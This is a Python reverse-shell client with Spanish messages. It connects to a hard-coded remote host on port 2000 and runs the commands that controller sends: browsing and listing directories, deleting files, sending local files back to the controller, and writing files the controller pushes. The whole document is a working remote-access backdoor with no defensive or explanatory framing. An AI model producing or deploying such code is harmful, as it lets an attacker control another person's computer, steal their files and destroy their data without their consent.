import socket
import os

direccion = ('192.168.100.17', 2000)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cliente:
    cliente.connect(direccion)
    print(f'Connect to {direccion}')
    while True:
        cmd = cliente.recv(1024).decode()

        if cmd.find('cd ') == 0:
            cmd = cmd[3:]
            try:
                os.chdir(cmd)
                resultado = f'Se movio a {cmd}'
            except:
                resultado = f'No se encontro {cmd}'
        elif cmd in ['pwd','chdir']:
            resultado = os.getcwd()
        elif cmd in ['ls','dir']:
            if os.name in ['ce','nt','dos']:
               resultado = os.popen('dir /B').read()
            else:
                resultado = os.popen('ls').read()
        elif cmd.find('rm ') == 0 or cmd.find('del ') == 0:
            cmd = cmd[cmd.find(' ')+1:]
            try:
                os.remove(cmd)
                resultado = f'Se elimino {cmd}'
            except:
                resultado = f'No se pudo eliminar {cmd}'
        elif cmd in ['clear','cls']:
            if os.name in ['ce','nt','dos']:
                resultado = os.popen('cls').read()
            else:
                resultado = os.popen('clear').read()
        elif cmd.find('down ') == 0:
            path = cmd[cmd.find(' ')+1:]
            if os.path.isfile(path):
                with open(path,'rb') as file:
                    resultado = file.read()
                cliente.sendall(resultado)
                continue
            else:
                resultado = 'La path no exite o no dirije a un archivo.'
        elif cmd.find('env ') == 0:
            nombre = cliente.recv(1024).decode()
            with open(nombre,'wb') as file:
                    bloqueo = cliente.getblocking()
                    datos = ""
                    # La primera vez lo forzamos a esperar la llegada de datos
                    cliente.setblocking(True)
                    try:
                        while True:
                            datos = cliente.recv(4096)
                            file.write(datos)
                            # A partir de ahora si no hay datos que leer finalizamos el bucle
                            cliente.setblocking(False)
                    except socket.error:
                        cliente.setblocking(bloqueo)
                        print(f'Se descargo {nombre}')
                        continue
        elif cmd == 'exit':
            break
        else:
            resultado = f'No se reconoce el comnado {cmd}'

        cliente.sendall(resultado.encode())
